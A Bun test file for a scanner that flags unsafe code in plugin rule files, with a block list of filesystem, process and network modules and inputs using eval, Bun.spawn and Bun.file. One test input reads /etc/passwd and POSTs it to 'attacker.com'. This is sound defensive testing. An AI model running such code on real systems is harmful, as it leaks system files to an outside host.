import { describe, expect, test } from "bun:test";

import { scanRuleSource } from "../../src/engine/rule-scanner";

describe("scanRuleSource", () => {
  describe("banned imports", () => {
    const bannedModules = [
      "node:fs",
      "fs",
      "node:child_process",
      "child_process",
      "node:net",
      "node:dgram",
      "node:http",
      "node:https",
      "node:http2",
      "node:worker_threads",
      "node:cluster",
      "node:vm",
      "node:fs/promises",
      "bun",
    ];

    for (const mod of bannedModules) {
      test(`blocks ${mod} import`, () => {
        const violations = scanRuleSource(`import x from "${mod}";`);
        expect(violations).toHaveLength(1);
        expect(violations[0].message).toContain(`"${mod}"`);
        expect(violations[0].message).toContain("blocked");
      });
    }

    const safeModules = ["node:path", "node:url", "node:util", "node:crypto"];

    for (const mod of safeModules) {
      test(`allows ${mod} import`, () => {
        const violations = scanRuleSource(`import x from "${mod}";`);
        expect(violations).toHaveLength(0);
      });
    }
  });

  describe("dangerous Bun APIs", () => {
    test("blocks Bun.spawn", () => {
      const violations = scanRuleSource(`Bun.spawn(["ls"]);`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Bun.spawn()");
    });

    test("blocks Bun.spawnSync", () => {
      const violations = scanRuleSource(`Bun.spawnSync(["ls"]);`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Bun.spawnSync()");
    });

    test("blocks Bun.write", () => {
      const violations = scanRuleSource(`Bun.write("output.txt", "data");`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Bun.write()");
    });

    test("blocks Bun.$", () => {
      const violations = scanRuleSource(`Bun.$;`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Bun.$()");
    });

    test("blocks Bun.file", () => {
      const violations = scanRuleSource(`Bun.file("/etc/passwd");`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Bun.file()");
    });
  });

  describe("computed property access", () => {
    test("blocks Bun[variable]", () => {
      const violations = scanRuleSource(
        `const method = "spawn"; Bun[method]();`
      );
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain(
        "Computed property access on Bun"
      );
    });

    test("blocks globalThis[variable]", () => {
      const violations = scanRuleSource(
        `const key = "fetch"; globalThis[key]();`
      );
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain(
        "Computed property access on globalThis"
      );
    });
  });

  describe("eval and Function constructor", () => {
    test("blocks eval()", () => {
      const violations = scanRuleSource(`eval("console.log(1)");`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("eval()");
    });

    test("blocks new Function()", () => {
      const violations = scanRuleSource(`new Function("return 1")();`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("new Function()");
    });

    test("blocks Function() without new", () => {
      const violations = scanRuleSource(`Function("return 1")();`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Function() constructor");
    });
  });

  describe("fetch", () => {
    test("blocks fetch()", () => {
      const violations = scanRuleSource(`fetch("https://example.com");`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("fetch()");
    });
  });

  describe("dynamic imports", () => {
    test("blocks import(variable)", () => {
      const violations = scanRuleSource(`const mod = "node:fs"; import(mod);`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Dynamic import()");
    });

    test("allows import with literal string", () => {
      const violations = scanRuleSource(`import("node:path");`);
      // Static import expression with literal — allowed by dynamic import check.
      // But node:path is safe so no import declaration violation either.
      const dynamicViolations = violations.filter((v) =>
        v.message.includes("Dynamic import()")
      );
      expect(dynamicViolations).toHaveLength(0);
    });
  });

  describe("global mutation", () => {
    test("blocks globalThis assignment", () => {
      const violations = scanRuleSource(`globalThis.myGlobal = "value";`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Mutating globalThis");
    });

    test("blocks process.env assignment", () => {
      const violations = scanRuleSource(`process.env = {};`);
      expect(violations).toHaveLength(1);
      expect(violations[0].message).toContain("Mutating process.env");
    });
  });

  describe("TypeScript support", () => {
    test("handles TypeScript syntax (interfaces, type annotations)", () => {
      const source = `
				interface Config { name: string; }
				const config: Config = { name: "test" };
				export default { rules: {} };
			`;
      const violations = scanRuleSource(source);
      expect(violations).toHaveLength(0);
    });

    test("handles satisfies keyword", () => {
      const source = `
				type RuleSet = { rules: Record<string, unknown> };
				export default { rules: {} } satisfies RuleSet;
			`;
      const violations = scanRuleSource(source);
      expect(violations).toHaveLength(0);
    });
  });

  describe("clean rule files", () => {
    test("passes a well-behaved rule using only RuleContext", () => {
      const source = `
				export default {
					rules: {
						"my-rule": {
							description: "Check something",
							async check(ctx) {
								const files = await ctx.glob("src/**/*.ts");
								for (const file of files) {
									const content = await ctx.readFile(file);
									if (content.includes("TODO")) {
										ctx.report.warning({ message: "Found TODO", file });
									}
								}
							},
						},
					},
				};
			`;
      const violations = scanRuleSource(source);
      expect(violations).toHaveLength(0);
    });

    test("passes rule with safe imports (node:path, node:url)", () => {
      const source = `
				import { join } from "node:path";
				import { URL } from "node:url";

				export default {
					rules: {
						"path-rule": {
							description: "Uses safe modules",
							async check(ctx) {
								const p = join("src", "index.ts");
								const url = new URL("https://example.com");
							},
						},
					},
				};
			`;
      const violations = scanRuleSource(source);
      expect(violations).toHaveLength(0);
    });
  });

  describe("multiple violations", () => {
    test("reports all violations in a single file", () => {
      const source = `
				import { readFileSync } from "node:fs";
				import { execSync } from "node:child_process";

				const secret = readFileSync("/etc/passwd", "utf8");
				fetch("https://attacker.com", { method: "POST", body: secret });
				Bun.spawn(["curl", "https://evil.com"]);
			`;
      const violations = scanRuleSource(source);
      expect(violations.length).toBeGreaterThanOrEqual(4);
    });
  });

  describe("violation location", () => {
    test("reports line and column numbers", () => {
      const source = `const x = 1;\neval("code");`;
      const violations = scanRuleSource(source);
      expect(violations).toHaveLength(1);
      expect(violations[0].line).toBeGreaterThan(0);
      expect(violations[0].column).toBeGreaterThanOrEqual(0);
    });
  });
});
